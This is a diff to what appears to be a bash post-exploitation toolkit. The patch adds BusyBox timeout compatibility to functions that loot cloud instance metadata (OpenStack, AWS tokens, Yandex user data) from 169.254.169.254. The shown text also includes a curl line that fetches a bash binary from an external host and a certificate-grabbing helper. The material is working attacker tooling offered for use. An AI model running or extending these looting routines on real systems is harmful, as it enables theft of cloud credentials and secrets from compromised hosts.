@@ -769,7 +769,7 @@ _loot_openstack() {
     [ -n "$_HS_NO_SSRF_169" ] && return
     [ -n "$_HS_GOT_SSRF_169" ] && return
 
-    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
+    str="$(timeout "${HS_TO_OPTS[@]}" 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
         rv="$?"
         { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
@@ -800,7 +800,7 @@ _loot_aws() {
 
     command -v curl >/dev/null || return # AWS always has curl
 
-    str="$(timeout 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
+    str="$(timeout "${HS_TO_OPTS[@]}" 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
         rv="$?"
         { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
@@ -844,7 +844,7 @@ _loot_yandex() {
     [ -n "$_HS_NO_SSRF_169" ] && return
     [ -n "$_HS_GOT_SSRF_169" ] && return
 
-    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
+    str="$(timeout "${HS_TO_OPTS[@]}" 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
         rv="$?"
         { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
@@ -1233,6 +1233,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL \"https://bin.ajam.dev/$(uname -m)/bash\" && 
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
     }
+
+    # BusyBox timeout variant needs -t
+    command -v timeout >/dev/null && timeout -t0 sleep 0 &>/dev/null && HS_TO_OPTS=("-t")
     hs_init_dl
 }
 
@@ -1243,7 +1246,7 @@ cn() {
     _hs_dep openssl || return
     _hs_dep sed || return
 
-    x509="$(timeout 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
+    x509="$(timeout "${HS_TO_OPTS[@]}" 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
     # Extract CN
     str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
     [[ "$str" == "subject"* ]] && [[ "$str" != *"/CN"* ]] && {
